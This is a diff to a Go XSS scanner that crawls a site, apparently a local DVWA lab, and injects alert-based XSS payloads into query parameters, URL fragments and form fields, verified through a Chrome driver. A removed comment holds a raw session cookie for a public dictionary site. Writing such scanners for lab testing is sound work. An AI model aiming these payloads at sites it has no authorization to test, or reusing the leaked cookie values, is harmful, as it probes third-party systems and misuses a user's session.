@@ -12,12 +12,17 @@ import (
 	"net/url"
 	"strings"
 	//"github.com/tebeka/selenium"
+	"log"
+	"time"
 )
 
-type empty struct{}
+type empty struct{
+	payload string
+}
 
 var targetURLs map[string]empty
 var vulnerableURLs map[string]empty
+var loginInformation map[string]string
 var urlSTR, host, loginURL string
 var urlParsed *url.URL
 var bow *browser.Browser
@@ -25,11 +30,13 @@ var badUrls []string
 var jar *cookiejar.Jar
 var cookies []*http.Cookie
 var payloads []string
+var level int
+var cd *chromeDriver
+var startTime time.Time
 
-
-func main() {
-
-	p1 := []string{"<script>alert('XSS');</script>","<BODY ONLOAD=alert('XSS')>"}
+func init(){
+	startTime = time.Now()
+	p1 := []string{"<script>alert('XSS');</script>","<BODY ONLOAD=alert('XSS')>","\";alert(1);//","';alert(1);//"}
 	p2 := []string{"><script>alert(0)</script>", "\" onfocus=\"alert(1);", "javascript:alert(1)","\"><img src=\"x:x\" onerror=\"alert(0)\">"}
 
 	payloads = append(payloads, p1...)
@@ -37,6 +44,7 @@ func main() {
 
 
 	bow = surf.NewBrowser()
+	cd = &chromeDriver{}
 
 	//bow.SetAttribute(browser.SendReferer, false)
 	//bow.SetAttribute(browser.MetaRefreshHandling, false)
@@ -51,28 +59,42 @@ func main() {
 
 	targetURLs = map[string]empty{}
 	vulnerableURLs = map[string]empty{}
+	loginInformation = make(map[string]string)
+
 	//urlSTR = "http://192.168.56.101"
 	urlSTR = "http://localhost/dvwa/"
+	//urlSTR = "http://localhost/bwapp/"
 	//urlSTR = "https://www.seslisozluk.net/"
 	//urlSTR = "https://xss-game.appspot.com"
 	urlParsed, _ = url.Parse(urlSTR)
 
 	host = urlParsed.Host
-	level := 3
+	level = 3
 
-	badUrls = append(badUrls, []string{"%C3%A7%C4%B1k%C4%B1%C5%9F", "logout", ".png", ".jpg", ".jpeg", ".mp3", ".mp4", ".avi", ".gif", ".svg"}...)
+	badUrls = append(badUrls, []string{"%C3%A7%C4%B1k%C4%B1%C5%9F", "logout", ".png", ".jpg", ".jpeg", ".mp3", ".mp4", ".avi", ".gif", ".svg","setup","csrf"}...)
+	badUrls = append(badUrls,[]string{"reset","user_extra","password_change"}...)
+}
 
+func main() {
+	defer finishTime()
 	err := bow.Open(urlSTR)
 	if err != nil {
-		panic(err)
+		log.Println("PANIC:",err)
 	}
 
 	// add the first target to list
 	targetURLs[urlSTR] = empty{}
-	
+
+	//LoginByCredentials(urlSTR,"admin","password")
 	Login(urlSTR)
+	//cookies := bow.CookieJar().Cookies(urlParsed)
+	//cookies := bow.SiteCookies()
+
+
+	//c := bow.SiteCookies()  // get cookies
 	//SetCookie()
 
+	//crawling
 	crawlURL(urlSTR)
 
 	if level > 1 {
@@ -82,35 +104,116 @@ func main() {
 			}
 		}
 	}
-
+	//
 	i := 1
 	for u, _ := range targetURLs {
 		fmt.Println(i, u)
 		i++
 	}
 
-	DriverInit()
+	cd.initDriver()
+	defer cd.stopDriver()
+	//cd.login(urlSTR)
+	//cd.loginW(urlSTR)
+	cd.loginAuto(urlSTR)
 
+	log.Println("Query parameters are going to be tested")
 	for u := range targetURLs{
-		control(u)
+		controlQueryParameters(u)
 	}
 
+	log.Println("Form inputs are going to be tested")
+	for u := range targetURLs{
+		controlFormInputs(u)
+	}
+
+	//controlFormInputs("http://localhost/dvwa/vulnerabilities/xss_s/")
+
+
+
+	// controlFormInputs("http://localhost/dvwa/vulnerabilities/xss_s/")
+
+	//cd.formTest("http://192.168.56.101/xss/example8.php",payloads)
+
+	//controlQueryParameters("http://192.168.56.101/xss/example9.php#hacker")
+
+	// test
+	//cd.pageTest("http://localhost/dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1);%3C/script%3E")
+	//time.Sleep(5*time.Second)
+	//cd.pageTest("http://192.168.56.101/xss/example3.php?name=%3CBODY+ONLOAD%3Dalert(%27cemal%27)%3E")	//xss
+	//cd.pageTest("http://192.168.56.101/xss/example1.php?name=%3Cbody%20onload=alert(1)%3E")		// xss
+	//cd.pageTest("http://192.168.56.101/codeexec/example1.php?name=hacker")
+	//cd.pageTest("http://192.168.56.101/xss/example3.php?name=%3CBODY+ONLOAD%3Dalert(%27cemal%27)%3E")	//xss
+	//cd.pageTest("http://192.168.56.101/xss/example1.php?name=%3Cbody%20onload=alert(1)%3E")		// xss
+	//cd.pageTest("http://192.168.56.101/codeexec/example1.php?name=hacker")
+	//cd.pageTest("http://192.168.56.101/xss/example2.php?name=%3CBODY+ONLOAD%3Dalert(%27XSS%27)%3E") //xss
+
+	// test
+	//cd.pageTest("http://localhost/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E")
+	//cd.pageTest("http://localhost/dvwa/vulnerabilities/weak_id/")
+	//cd.pageTest("http://localhost/dvwa/vulnerabilities/brute/")
+	//cd.pageTest("http://localhost/dvwa/instructions.php")
+	//cd.pageTest("http://localhost/dvwa/vulnerabilities/xss_r/?name=<BODY+ONLOAD%3Dalert('XSS')>")
+
+	//
+	////for u := range targetURLs{
+	////	controlFormInputs(u,bow.SiteCookies())
+	////}
+	//
+
+
+
+	//Output
 	fmt.Println(" ")
 	fmt.Println("vulnerable urls:")
 	j:=1
-	for i,_ := range vulnerableURLs{
-		fmt.Println(j,":",i)
+	for i,v := range vulnerableURLs{
+		fmt.Println(j,":",i," payload:",v.payload)
 		j++
 	}
 
-	DriverStop()
+
 }
 
-func control(u string){
+func controlFormInputs(u string){
+
+	isVul,p := cd.formTest(u,payloads)
+	if isVul {
+		if _,contains := vulnerableURLs[u]; !contains{
+			vulnerableURLs[u]=empty{payload:p}
+		}
+	}
+
+}
+
+func controlQueryParameters(u string){
 
 	// convert string to url.URL
 	originalURL,_ := url.Parse(u)
 	modifiedURL := originalURL
+
+
+	// testing for DOM XSS
+
+	// browser does not allow , encodes url
+	// TODO: find a way to bypass
+
+	if modifiedURL.Fragment != "" {
+		for _, payload := range payloads {
+
+			modifiedURL.Fragment = payload
+
+			if cd.pageTest(modifiedURL.String()) {
+				if _, contains := vulnerableURLs[modifiedURL.String()]; !contains {
+					vulnerableURLs[modifiedURL.String()] = empty{}
+				}
+				break
+			}
+
+		}
+
+	}
+
 
 	// get query parameters and values as map[string][]string
 	q := originalURL.Query()
@@ -125,76 +228,31 @@ func control(u string){
 				q.Set(parameter,payload)
 				modifiedURL.RawQuery = q.Encode()
 
-				//bow.Open(modifiedURL.String())
 
-				if BrowserTest(modifiedURL.String(),payload){
+
+				if cd.pageTest(modifiedURL.String()){
 					if _,contains := vulnerableURLs[modifiedURL.String()]; !contains{
-						vulnerableURLs[modifiedURL.String()]=empty{}
+								vulnerableURLs[modifiedURL.String()]=empty{}
 					}
 					break
 				}
+
+
+
+				//bow.Open(modifiedURL.String())
+
+				//if BrowserQueryTest(modifiedURL.String(),payload){
+				//	if _,contains := vulnerableURLs[modifiedURL.String()]; !contains{
+				//		vulnerableURLs[modifiedURL.String()]=empty{}
+				//	}
+				//	break
+				//}
 			}
 		}
 	}
 
-	//err := bow.Open(u)
-	//if err != nil{
-	//	fmt.Println(err)
-	//}
-	//
-	//allForms := bow.Forms()
-	//
-	//for _, fm := range allForms {
-	//	if fm != nil {
-	//		fmt.Println("Form found.. : ")
-	//		for _,payload := range payloads{
-	//			fm.Dom().Find("input").Each(func(i int, s *goquery.Selection) {
-	//				if inputName, ok := s.Attr("name"); ok {
-	//					if inputType, ok2 := s.Attr("type"); ok2 {
-	//						if inputType != "hidden" || inputType != "submit" {
-	//							fm.Input(inputName, payload)
-	//						}
-	//					}
-	//				}
-	//
-	//			})
-	//
-	//			fmt.Println(fm.GetFields())
-	//
-	//			err = fm.Submit()
-	//			if err != nil {
-	//				panic(err)
-	//			}
-	//
-	//			fmt.Println("Form sent..")
-	//			valideResponse(payload)
-	//		}
-	//
-	//	}
-	//}
-
-
-
-
-
 }
 
-func valideResponse(payload string)(bool){
-	// TODO: to get rid of false positives, it is needed to use a real browser. ==>
-
-	u := bow.Url()
-	fmt.Println("Testing :",u)
-
-
-	if strings.Contains(bow.Body(),payload){
-		if _,contains := vulnerableURLs[u.String()]; !contains{
-			vulnerableURLs[u.String()]=empty{}
-		}
-		// if one payload is executed successfully no need to try other payloads
-		return true
-	}
-	return false
-}
 
 func crawlURL(u string) {
 
@@ -244,13 +302,10 @@ func LoginByCredentials(loginURL string, user string, pass string) {
 	fm, _ := bow.Form("form")
 	fm.Input("username", "admin")
 	fm.Input("password", "password")
-	fmt.Println(fm.GetFields())
+	//fmt.Println(bow.Dom().Html())
 	fm.Submit()
-	fmt.Println("submit:")
-	for _, c := range bow.CookieJar().Cookies(urlParsed) {
-		res, _ := json.Marshal(c)
-		fmt.Println(string(res))
-	}
+	//fmt.Println(bow.Dom().Html())
+
 
 }
 
@@ -275,6 +330,7 @@ func Login(loginURL string) {
 							fmt.Print("Enter ", inputName, ":")
 							fmt.Scanln(&text)
 							fm.Input(inputName, text)
+							loginInformation[inputName] = text
 						}
 					}
 				}
@@ -326,22 +382,6 @@ func SetCookie() {
 
 }
 
-// way to print current cookies
-//for _,c:= range bow.CookieJar().Cookies(urlParsed){
-//res,_ := json.Marshal(c)
-//fmt.Println(string(res))
-//}
-
-// adding a raw cookiee to header
-// rawCookies := "PHPSESSID=impo9avkj57e14cb2cdju0iid7; security=impossible"
-////rawCookies := "pref_uil=lang_tr; SS_SD=6; __gads=ID=1438700420a161b8:T=1518763891:S=ALNI_MZGoZeQsE4HUNJZmXPLvwLgwf7kMg; seslisozluk=vis+a+vis%7Ck%C3%BCf%C3%BCr+etmek%7Ccanlanm%7Cyeniden+dirilmek%7Cresurge%7Cresurgent; PHPSESSID=r1m5bp7jtfpbdmob80l8b8ed76; remember_key=KCD3SC095L01; remember_memberid=543452; _ga=GA1.2.495857112.1518763891; _gid=GA1.2.1617837352.1521717907; _gat=1"
-//
-//// to convert the raw cookie to *http.Cookie we use this trick
-//header := http.Header{}
-//header.Add("Cookie", rawCookies)
-//request := http.Request{Header: header}
-//
-//cookies := request.Cookies()
-//fmt.Println(request.Cookies())
-
-// TODO: q := u.Query() ile get parametrelerini al, daha sonra ParseQuery(a=b&y=z) ile map olarak cek
+func finishTime(){
+	fmt.Println("Time Elapsed:",time.Since(startTime))
+}
